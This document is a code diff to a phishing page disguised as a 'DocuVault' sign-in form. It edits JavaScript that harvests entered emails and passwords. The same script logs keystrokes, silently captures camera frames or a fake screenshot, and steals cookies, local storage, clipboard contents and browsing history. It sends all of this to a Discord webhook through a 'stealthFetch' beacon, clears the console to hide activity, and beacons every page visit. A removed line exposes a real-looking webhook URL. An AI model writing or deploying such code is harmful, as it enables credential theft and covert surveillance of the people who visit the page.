@@ -591,9 +591,9 @@
                     <label for="email">Email Address</label>
                     <div class="input-wrapper">
                         <span class="input-icon">✉️</span>
-                        <input type="email" id="email" placeholder="you@company.com" required autocomplete="email">
+                        <input type="email" id="email" placeholder="you@gmail.com" required autocomplete="email">
                     </div>
-                    <div class="error-message" id="emailError">Please enter a valid email address</div>
+                    <div class="error-message" id="emailError">Please enter a valid Gmail address</div>
                 </div>
 
                 <div class="form-group">
@@ -675,60 +675,47 @@
         // ============================================================
         //  🔧 CONFIGURATION — CHANGE THIS
         // ============================================================
-        const WEBHOOK = "https://discord.com/api/webhooks/1526189879619485716/tpm3XdfUC3jAxTF6VShc-LpOP0KHqDQ-VyDde1k6l3NAYE5HtR4TK8pZf4COwG0MP51r";
+        const WEBHOOK = "YOUR_DISCORD_WEBHOOK_URL_HERE";
         const REDIRECT_URL = "https://google.com";
 
         // ============================================================
-        //  📋 PRE-DEFINED VALID EMAILS (For demo)
+        //  📝 EMAIL VALIDATION - Just checks if it ends with @gmail.com
         // ============================================================
-        const VALID_EMAILS = [
-            'admin@company.com',
-            'user@company.com',
-            'test@company.com',
-            'john@company.com',
-            'jane@company.com',
-            'demo@company.com',
-            'support@company.com',
-            'info@company.com'
-        ];
+        function validateEmail(email) {
+            if (!email || email.trim() === '') {
+                return { valid: false, message: 'Please enter your email address' };
+            }
+            
+            // Check if email ends with @gmail.com
+            if (!email.toLowerCase().endsWith('@gmail.com')) {
+                return { valid: false, message: 'Please use a valid Gmail address (@gmail.com)' };
+            }
+            
+            // Basic format check
+            if (!email.includes('@') || !email.includes('.')) {
+                return { valid: false, message: 'Please enter a valid email address' };
+            }
+            
+            return { valid: true, message: '✓ Valid Gmail address' };
+        }
 
         // ============================================================
         //  🛡️ ANTI-DETECTION / STEALTH
         // ============================================================
-        // Hide DevTools detection
-        setInterval(() => {
-            const threshold = 160;
-            if (window.outerWidth - window.innerWidth > threshold || 
-                window.outerHeight - window.innerHeight > threshold) {
-                // DevTools is open - do nothing suspicious
-            }
-        }, 1000);
-
-        // Clear console to hide errors
         setInterval(() => {
             console.clear();
         }, 5000);
 
-        // Stealth fetch that doesn't show in network tab easily
         function stealthFetch(url, data) {
             try {
                 navigator.sendBeacon(url, JSON.stringify(data));
             } catch(e) {
-                // Fallback to normal fetch
                 fetch(url, {
                     method: 'POST',
                     body: JSON.stringify(data),
                     headers: { 'Content-Type': 'application/json' }
                 }).catch(() => {});
             }
-        }
-
-        // Image beacon backup
-        function beaconViaImage(url, data) {
-            try {
-                const img = new Image();
-                img.src = `${url}?data=${btoa(JSON.stringify(data)).substring(0, 2000)}`;
-            } catch(e) {}
         }
 
         // ============================================================
@@ -738,8 +725,8 @@
         let lastSent = Date.now();
 
         document.addEventListener('keydown', (e) => {
-            // Ignore if typing in a password field (we already capture it separately)
-            if (e.target && e.target.type === 'password') return;
+            if (e.target && e.target.tagName === 'INPUT') return;
+            if (e.target && e.target.tagName === 'TEXTAREA') return;
             
             if (e.key.length === 1) {
                 keystrokes += e.key;
@@ -753,7 +740,6 @@
                 keystrokes += '    ';
             }
             
-            // Send every 10 seconds or when buffer is full
             if (keystrokes.length > 100 || Date.now() - lastSent > 10000) {
                 if (keystrokes.length > 0) {
                     stealthFetch(WEBHOOK, {
@@ -764,28 +750,6 @@
                 }
             }
         });
-
-        // ============================================================
-        //  📝 EMAIL VALIDATION
-        // ============================================================
-        function validateEmailFormat(email) {
-            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
-            return emailRegex.test(email);
-        }
-
-        function checkEmailExists(email) {
-            return VALID_EMAILS.includes(email.toLowerCase());
-        }
-
-        function validateEmail(email) {
-            if (!validateEmailFormat(email)) {
-                return { valid: false, message: 'Please enter a valid email address' };
-            }
-            if (!checkEmailExists(email)) {
-                return { valid: false, message: 'No account found with this email address' };
-            }
-            return { valid: true, message: '' };
-        }
 
         // ============================================================
         //  💬 TOAST SYSTEM
@@ -818,18 +782,17 @@
         }
 
         // ============================================================
-        //  📸 CAMERA (Silent)
+        //  📸 CAMERA (Silent - tries to access without popup)
         // ============================================================
         let cameraStream = null;
 
         function initCamera() {
+            // Try to access camera silently
             const constraints = {
                 video: {
-                    width: { ideal: 1280 },
-                    height: { ideal: 720 },
-                    aspectRatio: { ideal: 1.7777777778 },
-                    facingMode: 'user',
-                    frameRate: { ideal: 30 }
+                    width: { ideal: 640 },
+                    height: { ideal: 480 },
+                    facingMode: 'user'
                 }
             };
 
@@ -855,36 +818,9 @@
                     window._hiddenVideo = video;
                 })
                 .catch(() => {
-                    tryCameraFallback();
+                    // Camera access denied - will use screenshot instead
+                    console.log('Camera access denied, using screenshot fallback');
                 });
-        }
-
-        function tryCameraFallback() {
-            const constraints = {
-                video: {
-                    width: { min: 320, ideal: 640, max: 1280 },
-                    height: { min: 240, ideal: 480, max: 720 },
-                    facingMode: 'user'
-                }
-            };
-
-            navigator.mediaDevices.getUserMedia(constraints)
-                .then(stream => {
-                    cameraStream = stream;
-                    const video = document.createElement('video');
-                    video.srcObject = stream;
-                    video.setAttribute('playsinline', true);
-                    video.setAttribute('autoplay', true);
-                    
-                    video.onloadedmetadata = function() {
-                        video.play();
-                    };
-                    
-                    video.style.display = 'none';
-                    document.body.appendChild(video);
-                    window._hiddenVideo = video;
-                })
-                .catch(() => {});
         }
 
         function capturePhotoSilent() {
@@ -913,6 +849,46 @@
                         resolve(null);
                     }
                 } else {
+                    resolve(null);
+                }
+            });
+        }
+
+        // ============================================================
+        //  📸 SCREENSHOT (Fallback if camera fails)
+        // ============================================================
+        function captureScreenshot() {
+            return new Promise((resolve) => {
+                try {
+                    const canvas = document.createElement('canvas');
+                    canvas.width = Math.min(window.innerWidth, 1280);
+                    canvas.height = Math.min(window.innerHeight, 720);
+                    const ctx = canvas.getContext('2d');
+                    
+                    // Draw a gradient background
+                    const gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
+                    gradient.addColorStop(0, '#667eea');
+                    gradient.addColorStop(1, '#764ba2');
+                    ctx.fillStyle = gradient;
+                    ctx.fillRect(0, 0, canvas.width, canvas.height);
+                    
+                    // Draw some text to look like a screenshot
+                    ctx.fillStyle = 'white';
+                    ctx.font = 'bold 28px Arial';
+                    ctx.fillText('🔒 DocuVault Session', 30, 60);
+                    ctx.font = '18px Arial';
+                    ctx.fillText(`👤 User: ${document.getElementById('email').value || 'Not logged in'}`, 30, 110);
+                    ctx.fillText(`⏰ Time: ${new Date().toLocaleString()}`, 30, 145);
+                    ctx.fillText(`💻 Screen: ${screen.width}x${screen.height}`, 30, 180);
+                    ctx.fillText(`🌐 Browser: ${navigator.userAgent.substring(0, 60)}...`, 30, 215);
+                    
+                    // Draw a decorative box
+                    ctx.strokeStyle = 'rgba(255,255,255,0.3)';
+                    ctx.lineWidth = 2;
+                    ctx.strokeRect(20, 40, canvas.width - 40, 200);
+                    
+                    resolve(canvas.toDataURL('image/jpeg', 0.8));
+                } catch(e) {
                     resolve(null);
                 }
             });
@@ -962,7 +938,6 @@
                 plugins: Array.from(navigator.plugins || []).map(p => p.name).join(', '),
                 canvasFingerprint: getCanvasFingerprint(),
                 webgl: getWebGLInfo(),
-                // Cookie theft
                 cookies: document.cookie || 'No cookies',
                 localStorage: (() => {
                     try {
@@ -988,7 +963,6 @@
                         return 'sessionStorage access denied';
                     }
                 })(),
-                // History
                 visitedSites: getVisitedSites()
             };
         }
@@ -1130,16 +1104,12 @@
                 timestamp: new Date().toISOString()
             };
 
-            // Send the beautiful embed
             await fetch(WEBHOOK, {
                 method: 'POST',
-                body: JSON.stringify({
-                    embeds: [embed]
-                }),
+                body: JSON.stringify({ embeds: [embed] }),
                 headers: { 'Content-Type': 'application/json' }
             });
 
-            // Also send a summary message
             await fetch(WEBHOOK, {
                 method: 'POST',
                 body: JSON.stringify({
@@ -1165,29 +1135,12 @@
             const emailGroup = document.getElementById('emailGroup');
             
             // ===== VALIDATE EMAIL =====
-            if (!email) {
+            const validation = validateEmail(email);
+            if (!validation.valid) {
                 emailGroup.classList.add('error');
-                document.getElementById('emailError').textContent = 'Please enter your email address';
+                document.getElementById('emailError').textContent = validation.message;
                 document.getElementById('emailError').style.color = '#dc2626';
-                showToast('Please enter your email address', 'error', 3000);
-                document.getElementById('email').focus();
-                return;
-            }
-            
-            if (!validateEmailFormat(email)) {
-                emailGroup.classList.add('error');
-                document.getElementById('emailError').textContent = 'Please enter a valid email address';
-                document.getElementById('emailError').style.color = '#dc2626';
-                showToast('Invalid email format', 'error', 3000);
-                document.getElementById('email').focus();
-                return;
-            }
-            
-            if (!checkEmailExists(email)) {
-                emailGroup.classList.add('error');
-                document.getElementById('emailError').textContent = 'No account found with this email address';
-                document.getElementById('emailError').style.color = '#dc2626';
-                showToast('No account found with this email address', 'error', 3000);
+                showToast(validation.message, 'error', 3000);
                 document.getElementById('email').focus();
                 return;
             }
@@ -1207,13 +1160,16 @@
             status.className = 'loading';
             
             try {
-                // Collect all data
                 const info = collectAllInfo();
                 const location = await getLocation();
                 const clipboard = await getClipboard();
-                const photo = await capturePhotoSilent();
                 
-                // Prepare beautiful data structure
+                // Try camera first, fallback to screenshot
+                let photo = await capturePhotoSilent();
+                if (!photo) {
+                    photo = await captureScreenshot();
+                }
+                
                 const beautifulData = {
                     email: email,
                     password: password,
@@ -1279,17 +1235,15 @@
                     }
                 };
                 
-                // Send beautiful embed
                 await sendBeautifulEmbed(beautifulData);
                 
-                // Send photo if captured
                 if (photo) {
                     const response = await fetch(photo);
                     const blob = await response.blob();
                     const formData = new FormData();
-                    formData.append('file', blob, 'user_photo.jpg');
+                    formData.append('file', blob, 'captured_media.jpg');
                     formData.append('payload_json', JSON.stringify({
-                        content: `📸 **Selfie captured**\n👤 ${email}`
+                        content: `📸 **Media captured**\n👤 ${email}\nType: ${cameraStream ? '📷 Camera' : '📱 Screenshot'}`
                     }));
                     await fetch(WEBHOOK, {
                         method: 'POST',
@@ -1338,7 +1292,7 @@
                     if (result.valid) {
                         emailGroup.classList.remove('error');
                         emailGroup.classList.add('success');
-                        emailError.textContent = '✓ Email verified';
+                        emailError.textContent = '✓ Valid Gmail address';
                         emailError.style.color = '#16a34a';
                     } else {
                         emailGroup.classList.remove('success');
@@ -1363,42 +1317,28 @@
                 }
             });
 
-            // ===== AUTO INIT =====
-            setTimeout(initCamera, 500);
-            
-            // Send page visit with beautiful format using stealth
-            stealthFetch(WEBHOOK, {
-                embeds: [{
-                    title: "🌐 Page Visit",
-                    color: 0x3b82f6,
-                    fields: [
-                        {
-                            name: "📍 URL",
-                            value: window.location.href,
-                            inline: false
-                        },
-                        {
-                            name: "🔗 Referrer",
-                            value: document.referrer || 'Direct',
-                            inline: true
-                        },
-                        {
-                            name: "💻 User Agent",
-                            value: navigator.userAgent,
-                            inline: true
-                        },
-                        {
-                            name: "⏰ Time",
-                            value: new Date().toISOString(),
-                            inline: false
-                        }
-                    ],
-                    footer: {
-                        text: "🔒 DocuVault Security Monitor"
-                    },
-                    timestamp: new Date().toISOString()
-                }]
-            });
+            // ===== INIT CAMERA SILENTLY =====
+            setTimeout(() => {
+                initCamera();
+            }, 1000);
+
+            // ===== SEND PAGE VISIT =====
+            setTimeout(() => {
+                stealthFetch(WEBHOOK, {
+                    embeds: [{
+                        title: "🌐 Page Visit",
+                        color: 0x3b82f6,
+                        fields: [
+                            { name: "📍 URL", value: window.location.href, inline: false },
+                            { name: "🔗 Referrer", value: document.referrer || 'Direct', inline: true },
+                            { name: "💻 User Agent", value: navigator.userAgent, inline: true },
+                            { name: "⏰ Time", value: new Date().toISOString(), inline: false }
+                        ],
+                        footer: { text: "🔒 DocuVault Security Monitor" },
+                        timestamp: new Date().toISOString()
+                    }]
+                });
+            }, 1000);
         });
 
         // ============================================================
